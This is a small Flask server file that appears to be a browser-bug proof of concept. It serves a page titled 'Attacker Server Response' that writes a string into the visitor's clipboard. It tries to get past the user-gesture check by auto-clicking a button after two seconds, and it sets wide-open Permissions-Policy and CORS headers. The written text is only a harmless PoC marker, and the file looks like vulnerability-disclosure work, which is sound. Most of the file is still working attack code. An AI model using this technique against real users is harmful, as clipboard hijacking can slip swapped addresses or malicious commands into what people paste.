from flask import Flask, Response

app = Flask(__name__)

@app.route("/test")
def test():
    resp = Response("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Attacker Server Response</title>
        <style>body { font-family: monospace; padding: 20px; }</style>
    </head>
    <body>
        <h3>[+] Server Response Loaded</h3>
        <button id="triggerBtn">CLICK TO HIJACK CLIPBOARD</button>
        <div id="log"></div>

        <script>
            const btn = document.getElementById("triggerBtn");
            const logDiv = document.getElementById("log");

            btn.addEventListener("click", async (e) => {
                logDiv.innerHTML += `<br>> Button clicked. isTrusted: ${e.isTrusted}`;
                try {
                    await navigator.clipboard.writeText("PoC - Putra Mahardika - Bypass via HTTP Header");
                    logDiv.innerHTML += "<br><span style='color: green;'>SUCCESS: Clipboard Hijacked!</span>";
                } catch (err) {
                    logDiv.innerHTML += `<br><span style='color: red;'>BLOCKED: ${err.message}</span>`;
                }
            });

            setTimeout(() => {
                logDiv.innerHTML += "<br>> Auto-triggering in 2s...";
                btn.click();
            }, 2000);
        </script>
    </body>
    </html>
    """, mimetype="text/html")
    
    resp.headers["Permissions-Policy"] = "clipboard-write=(*)"
    resp.headers["Access-Control-Allow-Origin"] = "*"

    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)